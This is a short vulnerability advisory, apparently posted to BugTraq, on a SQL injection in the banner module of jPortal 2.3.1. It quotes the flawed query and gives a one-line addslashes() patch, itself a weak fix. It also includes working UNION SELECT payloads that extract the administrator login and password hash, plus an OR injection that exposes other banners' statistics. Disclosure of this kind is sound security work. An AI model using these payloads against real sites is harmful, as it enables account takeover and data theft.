Subject: Sql injection in jPortal version 2.3.1 (module banner)


Hello BugTraq,

I've found possibility to inject sql code in jPortal version 2.3.1, in
module "banner" (module/banner.inc.php).

Bug is in these lines of code:
$query = "SELECT * FROM $bann_a_tbl WHERE title='$haslo' ORDER BY id DESC";
(line 192)

There is unfiltered variable $haslo. In order to patch this code just add this:
$haslo = addslashes($haslo); before above line.

PoC:
go to http://[victim]/jportal/banner.php and try this:
' UNION SELECT NULL, nick, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL from admins where '1=1
and then:
' UNION SELECT NULL, pass, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
NULL, NULL, NULL, NULL, NULL from admins where '1=1
After that, You gain login and md5 hash password of administrator.


PoC 2:
try to inject this code:
' or id='x    x - banner id
After that, You can see statistics of not banners, to which you
haven't got passwords.

Vendor (http://jportal2.com) has been informed already.
